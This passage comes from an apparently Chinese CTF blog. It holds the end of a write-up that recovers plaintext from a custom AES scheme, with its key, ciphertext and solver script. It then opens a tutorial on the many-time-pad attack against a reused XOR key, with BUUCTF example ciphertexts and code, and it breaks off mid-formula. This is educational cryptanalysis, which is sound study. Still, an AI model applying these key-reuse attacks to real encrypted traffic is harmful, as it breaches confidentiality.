class="hljs-number">16</span>):      s=data[i:i+<span class="hljs-number">16</span>].ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&quot;\n&quot;</span>)      c+=cipher.encrypt(xor(s,iv))      iv=xor(s,c[-<span class="hljs-number">16</span>:])      key=b64encode(key)  c=b64encode(c)    <span class="hljs-built_in">print</span>(key)  <span class="hljs-built_in">print</span>(c)        <span class="hljs-string">&quot;&quot;&quot;  </span><span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;  </span><span class="hljs-string">b&#x27;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&#x27;  </span><span class="hljs-string">  </span><span class="hljs-string">&quot;&quot;&quot;</span></code></pre></div><p>这段代码实现了一个基于AES加密的自定义加密方案，结合了ECB模式和CBC模式的某些特性，明文按16字节分组进行加密，打印出key和密文，iv(偏移量)未知，需要还原明文。可以发现本题是多次使用同样的流密码。<br>所以本题其实是利用利用<a href="https://so.csdn.net/so/search?q=MTP&amp;spm=1001.2101.3001.7020">MTP</a>攻击来求解，比较好的两篇文章可以参考<br>[参考一](<a href="https://www.ruanx.net/many-time-pad/">Many-Time-Pad 攻击</a>)<br><a href="%5BMTP%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/m0_63303407/article/details/127193042)">参考二</a></p><p>exp:</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment"># Python3  </span><span class="hljs-keyword">import</span> base64  <span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES  <span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor  <span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *  <span class="hljs-keyword">import</span> Crypto.Util.strxor <span class="hljs-keyword">as</span> xo  <span class="hljs-keyword">import</span> libnum, codecs, numpy <span class="hljs-keyword">as</span> np      <span class="hljs-keyword">def</span> <span class="hljs-title function_">isChr</span>(<span class="hljs-params">x</span>):      <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) &lt;= x <span class="hljs-keyword">and</span> x &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) &lt;= x <span class="hljs-keyword">and</span> x &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">infer</span>(<span class="hljs-params">index, pos</span>):      <span class="hljs-keyword">if</span> msg[index, pos] != <span class="hljs-number">0</span>:          <span class="hljs-keyword">return</span>      msg[index, pos] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>)      <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):          <span class="hljs-keyword">if</span> x != index:              msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>)      <span class="hljs-keyword">def</span> <span class="hljs-title function_">know</span>(<span class="hljs-params">index, pos, ch</span>):      msg[index, pos] = <span class="hljs-built_in">ord</span>(ch)      <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):          <span class="hljs-keyword">if</span> x != index:              msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="hljs-built_in">ord</span>(ch)      <span class="hljs-keyword">def</span> <span class="hljs-title function_">getSpace</span>():      <span class="hljs-keyword">for</span> index, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(c):          res = [xo.strxor(x, y) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> c <span class="hljs-keyword">if</span> x != y]          f = <span class="hljs-keyword">lambda</span> pos: <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(isChr, [s[pos] <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> res])))          cnt = [f(pos) <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x))]          <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x)):              dat.append((f(pos), index, pos))      key = <span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>  key = base64.b64decode(key)  c = <span class="hljs-string">b&#x27;A0bzFxdM95YoXm64g0gZkiTloPsBAq7iV56t1M7Q4zVNxRJSTdZH0lzOMa7QyIQbKN/ftm01iZgQAk+JVgCB6hlCdMPWkdpKYHix8BTq/ClEHUPwMEjUEvgKD4tH3T/thoccBw1jfJ9RjhXbMFByWn5cyA/gHVvEEJRpII/ryKMQkzelioQ5b0MfhSy4INLqQk6yAgLzihip5ho7lDJCbYcaz85bDksOo5n9kjOfjFnjUn9G7jX+AtyhygPlGfrvauTeuPdVxqrJTVHvrzUNAqiqtCElX+BWpicP2mkZLt5B/gpquTv8U+StrdTOcr7UkWuz+YdhXkTJYUZguv7EbEnRy+M64QzqfnNf8Zk0tJQ5xOumbY8hxGTuZ8w3rWxjPKLhdgTGLgMcMYF3hPb2eqG9VZKC3T9zElI5MWPyIdkmqkrLEt6vGT8AxWJy1hl2ApkGhrJFB0DobJircN6kXUXvZXitjXSH+BA48muaRlAwK13re+zIcbI+B7+Tm3LuRT9j5NWD9RBoy+IeAQvR05IKWqEpqXEScmZsQxpAFZCSnbchYaYNAuHvBwMcMW7vTMyxROHRtyZ+gWNUhpd8CcZ9FA6w+cwQLMWW5D4nUCMK+NEsSyTBBm/jTiAp/waq+2dTVyBhbQtmm9pBtZtHJtfeVRKuZRXduNnlWDa7Wlwv0Jk2EIJpAaXxosuZnO0PHW3oX+WO5F9ydIfIJAFUpBrn4fMx3c7IJ08+bKwAfBw/johSs1ieyX/YjOOL1KbE9J6Hz3ZBBR4waQ4p9sdLsJ9UFnNghH0ZuB2F7bGoH7SurvaMglo3FyQAfM+n/EVCGWnax/JGEcw5YZuS2c7y5Gd4oOCmpFO/lVj0IaOlZsFsMgQ3GUsBT2h1yh4yarlYUczvGNyOyfUXfueCDBQJNJ7adbdra/DHpV3LXieADKED2HankT+9ACs8oVYPpZhji0UuCdvs1txytsCqPSf5l7JLDkrGP3/7Ob7UcCA4h/B+6/0xg7h+ZJ6ZR41sDpOR8S4pmPlfJkU/np52QZfplY0sKpKlaYhuhUmMSle2TAcvNUGHobNTReFV/MOfX5/HX6behFAeOwHGI14AvUbDmrmkVvbyU88DzBW2YQ/tTTiSLg/wgggkkhLd17NZAMB3XbKuw3WdkdyJfTTpyiN05DqMwV3q64fpzasFXFNQ7ix8Q/APov/TmBYtgFw4ys2jKC6Yws166RXRkrQXzY4Ey9Xvjp5i5nUgW2HLHRGz2B5lg0jI9oWjj5+89Y0Tcqb81OFD5SfeqTbg7Y2WoW6YjQ/Hzvt1l0+p/lFrnOy3ORfhwl+DFBZi4P9i+Hh7/uC1kCW8Lil2M9oVaAH4YB2yhm61AqEk4NPhSeTuioaFfvUY5lD75QiM6BdDFMTlNkC7crXmuiUpztHTzIS6E1kVARI8xsGeljjmJmuKIfQPPQfvSnnAjGeaxCNmRPDMgFGltFiGy63Pv/tVRWbUWiB27APHPsqM2qcV/nM8IwDx5xmwExl/atQXGzn/LL4xyqzmyzD+2qMeZqfzcKZWOjoWIX+SycPvc62HAQmsKqZK5ZO2JKq5OeuFEovG9oOcRYve1XStbTQYiocEbQ4XX/c6xE0cm9P/I5NM1Mlr6CT6qt3Pqb/m+7s/kwzww59FKOq5R6HmK7SHCQ6gwTQ1ciGWbJF3NLHuOpe08X4xl/l0tJengSfJRJ39Q9WwZbgBlEPf7NYeMlR9zU9QQxvZ+r4LiaJVYrQYSCcDj37Vk9XVRMijBDWDWFbK5sgkDHQYmwGYiwH4hEAqAAXDNj1/f2eRFbIU2GN6Wfj89fEINJjoG/1O/I5Q8S7tHnlWFQNoXJQ2e4r2Aca9RPLVCWz7Nq96YUKBRN3afW/9FSwWLLvjsBptQmoRj4FwmJzJf7Vj6KCOkm6mdaZ4l6FB4/E2Lk9aopD7Q473leULPM1CydXWme/8WKUqEucDwraXS57+Z+iGRMvQ8MABtZboAVFK2B1mzNL4Ba/bxVE4puy4HwvQI+N1tKmeMf99FfR13IA0y+FWL3eCzXKw8gimaJCW1e3QJJWDorDXRRjExeokMGGHzOd8MrTfNNFGWSPqZRTdGJxW7wOWQi3bHT0WSqP1fBpdU9m+WKHIxy57dL/8JFJJ97R56P76rlToRrM825JcTBEfrK0Nb9Q+2RI83vyTA2UxH9s9cSnWd+e7nacrfXjV7EjkGHgblEGHX9LqNETaZpBAL0NG9OAJ0+f+6id4/Ixcee0jx4b8k5xvblujFEdK0q2MRo2uTxSAFMpelt8JY0EZbnF9uT88N4LPms3cNeKBt0KBhx+vshFKMc/b3W7OMCo6m7EyzmcTmMe+Y6CO0x0FF0p6h1bTnJu3MMok1hO27iBSfYusHgKWVmKpgNHjiDfuBYnuBCysa+hHQZW23zxNRqi2OGAy6zCGPOY4E4nyUA6g/jlVOjq6fFv1VHN1tlQlBOCvB9r5B0os1zI2XL/Mlb9eggNuA8nw2igDm+9qkBtLxOXojAGDonAPzBagHXnVd+0kLdUGEoddt45A2fgSSociCx4tVDMd5ag1zR4VxdADAy0lnmW0n8noAT5y60SV7gICvMOphILBRjk365Mu6GNA3C+n8k5YH9sRnS7Z5EVEKdSeYigJs4XNavD50/paKnJcux2l3gzm/1aTUMzLd8tw7vZuUWv1XaYULcez8ieEMeACETyN53+RlcPQefupgszELvwlKz0prl5ydHCPOA7+ZS2zfUZOEmRSBNaIZUCd5euNg+HXMeFa/Qb452+KKEjq7vRthC4hH9gluaYMl/eXboQvvVu4xDhfVW403enI7sxdMR3t2WO1cOaLE8IN5c71W+IqhaRbJ/Prlo/pk/XAtMvimZxIN4y5/oP5vQ/lCt5jM9wAtPKSoQbJxWIYWNrXVfkZUOOwD2tlOmyxMCcKFr8921JHgtWqcYliElNX19hzmYhow+19EV3zhITzsGOX/PP1BHIKz/NJyKcGqx1hlfrDfDVedhJWkQL9sg4clbfguprs3KG5YNbbjclaK9JoEboBY3EGBGHtsWfmIRAREwy1a53y/a/NUDLaQxrMsyV/YnbiyBevGjMVNnqIY5T0YtPLL/s5Wvmq7EU9qoMDIlaosCf616TagcZalGFQumL15q6wx3FxwVB5EAjFa/MKnZNc0CqbFhXgEevp1ZXRnjEAdSK99gyAmwVawWpxIWXZQvQ5w7tIQ+nF8utoG4ab/AdLbZyKCtT8pxjiHifNcCCkLfew8Qq9S2JnrhCUMs9SEiRrLZHiE9JVlwbUJzAQjCM6G4tdeLNEApqDv4eZ7zh2U9K2+Gk9OjBgSk5xMjRkCzKCrNAKgRLoJ1Gu8L4T9LSBp1juhUsyaIaK&#x27;</span>  c = base64.b64decode(c)  cipher = AES.new(key, mode=AES.MODE_ECB)  t = []  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(c), <span class="hljs-number">16</span>):      <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:          t.append(cipher.decrypt(c[i:i + <span class="hljs-number">16</span>]))  <span class="hljs-comment"># s1 ^ iv  </span>    <span class="hljs-keyword">else</span>:          t.append(xor(cipher.decrypt(c[i:i + <span class="hljs-number">16</span>]), c[i - <span class="hljs-number">16</span>:i]))  tmp = []  tmp.append(t[<span class="hljs-number">0</span>])  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(t)):      tttt = t[i]      <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, i):          tttt = xor(tttt, t[j])      tmp.append(tttt)  <span class="hljs-comment"># si ^ iv  </span><span class="hljs-comment"># MTP attack  </span>c = tmp  dat = []  msg = np.zeros([<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">len</span>(c[<span class="hljs-number">0</span>])], dtype=<span class="hljs-built_in">int</span>)  getSpace()  dat = <span class="hljs-built_in">sorted</span>(dat)[::-<span class="hljs-number">1</span>]  <span class="hljs-keyword">for</span> w, index, pos <span class="hljs-keyword">in</span> dat:      infer(index, pos)    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> x]) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> msg]))</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Many Time Pad Attack</title>
    <link href="/2025/06/22/Many-Time-Pad-Attack/"/>
    <url>/2025/06/22/Many-Time-Pad-Attack/</url>
    
    <content type="html"><![CDATA[<h2 id="一些基础知识">一些基础知识</h2><p><strong>符号：</strong></p><p>⊕ 代表异或</p><p>C1 代表密文</p><p>M1 代表明文</p><p><strong>性质：</strong></p><ol><li>交换律</li><li>结合律 (a ⊕ b ) ⊕ c = a⊕ ( b ⊕ c)</li><li>任何数x x ⊕ x = 0 x ⊕ 0 = X</li><li>自反性 x ⊕ b ⊕ b = x ⊕ 0 = x</li></ol><h2 id="Description">Description</h2><p>Many-Time-Pad (多时间垫) 攻击是一种针对多次使用相同密钥的流密码（如一次性密码本，One-Time Pad）的密码分析技术。其核心原理是利用密钥重用导致的明文信息泄露，通过数学和统计方法恢复部分或全部明文。以下是其核心原理和步骤：</p><p><strong>1. 一次性密码本（OTP）的安全前提</strong><br>OTP的安全性是建立在：</p><ul><li>密钥完全随机且仅使用一次。</li><li>密钥长度 ≥ 明文长度。</li><li>若同一密钥被多次加密不同明文（即 C₁ = P₁ ⊕ K, C₂ = P₂ ⊕ K），则攻击者可通过密文的组合推断出明文信息。</li></ul><p><strong>2. 攻击原理：密钥重用的漏洞</strong><br>当同一密钥 K 加密多个明文时，密文之间的异或（⊕）等价于明文之间的异或：</p><p>$C₁ ⊕ C₂ = (P₁ ⊕ K) ⊕ (P₂ ⊕ K) = P₁ ⊕ P₂$<br>形象一点可以表达成这样：</p><div class="code-wrapper"><pre><code class="hljs abnf">密文 <span class="hljs-operator">=</span> 明文 ⊕ 密钥密文<span class="hljs-number">1</span> ⊕ 密文<span class="hljs-number">2</span> <span class="hljs-operator">=</span> 明文<span class="hljs-number">1</span> ⊕ 明文<span class="hljs-number">2</span> ⊕ 密钥<span class="hljs-number">1</span> ⊕ 密钥<span class="hljs-number">2</span></code></pre></div><p>此时，攻击者获得了 P₁ ⊕ P₂（即明文的异或结果），而无需知道密钥 K。</p><p><strong>3. 利用明文冗余恢复信息</strong><br>通过分析 P₁ ⊕ P₂，攻击者可以利用自然语言的统计特性（如字母频率、空格、常见词）逐步推测明文。例如：</p><ul><li><p>空格字符攻击：在ASCII编码中，空格（0x20）与字母异或的结果具有特定模式（如大写/小写转换）。</p></li><li><p>词频分析：对 P₁ ⊕ P₂ 的局部进行猜测，若某段异或结果符合常见词的统计特征（如英文中的&quot;the&quot;、“and”），则可反推明文片段。</p></li></ul><h2 id="实践">实践</h2><h3 id="BUUCTF-AFCTF2018">BUUCTF: [AFCTF2018]</h3><div class="code-wrapper"><pre><code class="hljs dns"><span class="hljs-number">25030206463d</span>3d393131555f7f1d061d4052111a195<span class="hljs-number">44e2e5d54</span><span class="hljs-number">0</span>f020606150f203f307f5c0a7f24070747130e165<span class="hljs-number">45000035d54</span><span class="hljs-number">1203075429152</span>a7020365c167f390f1013170b1006481e13144e<span class="hljs-number">0</span>f4610170e1e2235787f7853372c0f065752111b154<span class="hljs-number">54e0e0901</span><span class="hljs-number">081543000</span>e1e6f3f3a3348533a270d064a02111a1b5f<span class="hljs-number">4e0a1855</span><span class="hljs-number">0909075412132</span>e247436425332281a1c561f04071d5<span class="hljs-number">20f0b1158</span><span class="hljs-number">4116111</span>b101e2170203011113a69001b4752060<span class="hljs-number">1155205021901</span><span class="hljs-number">041006064612297020375453342</span>c17545a014518114<span class="hljs-number">11a470e44</span><span class="hljs-number">021311114</span>a5b0335207f7c167f22001b44520c15<span class="hljs-number">544801125d40</span><span class="hljs-number">06140611460</span>c26243c7f5c167f3d015446010053<span class="hljs-number">005907145d44</span><span class="hljs-number">0</span>f05110d160f263f3a7f4210372c03111313090415481d49530f</code></pre></div><p>设每一个字符串（密文）为$C_i$,都是某个<code>key</code>异或上明文 $M_i$ 得到的.我们的目标是获取到这个key,已知明文是英文句子.</p><p>$C_1 ⨁ C_2 =(M_1 ⨁ key) ⨁ (M_2 ⨁ key) = M_1 ⨁ M_2$</p><p>因此两个密文异或得到两个明文</p><p>我们使用$C_1$异或上其他的密文</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> stringloca = string.ascii_lowercase + string.ascii_uppercase<span class="hljs-keyword">def</span> <span class="hljs-title function_">hextostr</span>(<span class="hljs-params">hexstr</span>):    <span class="hljs-built_in">hex</span> = hexstr.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)    str_bin = binascii.unhexlify(<span class="hljs-built_in">hex</span>)    <span class="hljs-keyword">return</span> str_bin.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)c1 = <span class="hljs-string">&quot;25030206463d3d393131555f7f1d061d4052111a19544e2e5d&quot;</span>c2 = <span class="hljs-string">&#x27;0f020606150f203f307f5c0a7f24070747130e16545000035d&#x27;</span>c3 = <span class="hljs-string">&#x27;1203075429152a7020365c167f390f1013170b1006481e1314&#x27;</span>c4 = <span class="hljs-string">&#x27;0f4610170e1e2235787f7853372c0f065752111b15454e0e09&#x27;</span>c5 = <span class="hljs-string">&#x27;081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18&#x27;</span>c6 = <span class="hljs-string">&#x27;0909075412132e247436425332281a1c561f04071d520f0b11&#x27;</span>c7 = <span class="hljs-string">&#x27;4116111b101e2170203011113a69001b475206011552050219&#x27;</span>c8 = <span class="hljs-string">&#x27;041006064612297020375453342c17545a01451811411a470e&#x27;</span>c9 = <span class="hljs-string">&#x27;021311114a5b0335207f7c167f22001b44520c15544801125d&#x27;</span>c10 = <span class="hljs-string">&#x27;06140611460c26243c7f5c167f3d015446010053005907145d&#x27;</span>c11 = <span class="hljs-string">&#x27;0f05110d160f263f3a7f4210372c03111313090415481d49&#x27;</span>chiphers =[c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]s2 = hextostr(c2)sc1 = hextostr(c1)<span class="hljs-keyword">for</span> chipher <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(chiphers)):    <span class="hljs-keyword">if</span> chipher == <span class="hljs-number">0</span>:        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(sc1)):        asc =<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(sc1[i]) ^ <span class="hljs-built_in">ord</span>(hextostr(chiphers[chipher])[i]))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> asc:            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> loca:                <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&quot;&quot;</span>)            <span class="hljs-keyword">else</span>:                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;.&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)    <span class="hljs-built_in">print</span>()</code></pre></div><p>得到的内容如下：</p><div class="code-wrapper"><pre><code class="hljs stylus">...<span class="hljs-selector-class">.S</span>...<span class="hljs-selector-class">.N</span><span class="hljs-selector-class">.U</span>....<span class="hljs-selector-class">.A</span>.<span class="hljs-selector-class">.M</span><span class="hljs-selector-class">.N</span>....<span class="hljs-selector-class">.Ro</span>.<span class="hljs-selector-class">.I</span>..<span class="hljs-selector-class">.I</span>...<span class="hljs-selector-class">.SE</span>...<span class="hljs-selector-class">.P</span><span class="hljs-selector-class">.I</span><span class="hljs-selector-class">.E</span>.<span class="hljs-selector-class">.H</span>..<span class="hljs-selector-class">.IN</span>.<span class="hljs-selector-class">.H</span>..........<span class="hljs-selector-class">.T</span>.<span class="hljs-selector-class">.A</span><span class="hljs-selector-class">.H</span><span class="hljs-selector-class">.R</span>....<span class="hljs-selector-class">.E</span>...<span class="hljs-selector-class">.P</span>.....<span class="hljs-selector-class">.E</span>..<span class="hljs-selector-class">.RT</span>..<span class="hljs-selector-class">.E</span>..<span class="hljs-selector-class">.M</span>...<span class="hljs-selector-class">.M</span>...<span class="hljs-selector-class">.A</span><span class="hljs-selector-class">.L</span>d..<span class="hljs-selector-class">.V</span>.<span class="hljs-selector-class">.I</span>.<span class="hljs-selector-class">.DNEt</span>.......<span class="hljs-selector-class">.K</span><span class="hljs-selector-class">.D</span>......<span class="hljs-selector-class">.I</span>...<span class="hljs-selector-class">.K</span>.<span class="hljs-selector-class">.I</span><span class="hljs-selector-class">.ST</span>..<span class="hljs-selector-class">.TiS</span>....<span class="hljs-selector-class">.f</span>..<span class="hljs-selector-class">.N</span><span class="hljs-selector-class">.I</span>.......<span class="hljs-selector-class">.M</span><span class="hljs-selector-class">.O</span>..........<span class="hljs-selector-class">.N</span><span class="hljs-selector-class">.I</span>..<span class="hljs-selector-class">.I</span><span class="hljs-selector-class">.S</span><span class="hljs-selector-class">.I</span>.<span class="hljs-selector-class">.I</span>.....<span class="hljs-selector-class">.P</span>...<span class="hljs-selector-class">.N</span><span class="hljs-selector-class">.OH</span>..<span class="hljs-selector-class">.SA</span>...<span class="hljs-selector-class">.Sg</span>..</code></pre></div><p>可以观察到，有些列上有大量的英文字符，有些列一个英文字符都没有。这是偶然现象吗？</p><h3 id="ascii表">ascii表</h3><p>ascii 码表在 Linux 下可以通过 man ascii 指令查看。它的性质有：</p><ul><li>0x20 是空格。 低于 0x20 的，全部是起特殊用途的字符； 0x20~0x7E 的，是可打印字符。</li><li>0x30~0x39 是数字 0,1,2…9。</li><li>0x41~0x5A 是大写字母 A-Z； 0x61~0x7A 是小写字母 a-z.</li></ul><p>我们可以注意到一个至关重要的规律：小写字母 xor 空格，会得到对应的大写字母；大写字母 xor 空格，会得到小写字母！所以，如果 <code>x ⨁ y</code> 得到一个英文字母，那么x和y之中有一个很大概率可能是空格，那么来看 C1 ⊕ 其他密文也就是M1 ⊕ 其他明文的表，如果第<code>col</code>列存在大量英文字母,我们可以猜测 <code>M1[col]</code> 是一个空格 知道M1的col位是空格有什么用呢？别忘了异或运算下，<code>x</code>的逆元是其自身。所以</p><p><strong>$M_i[col] = M_1[col] 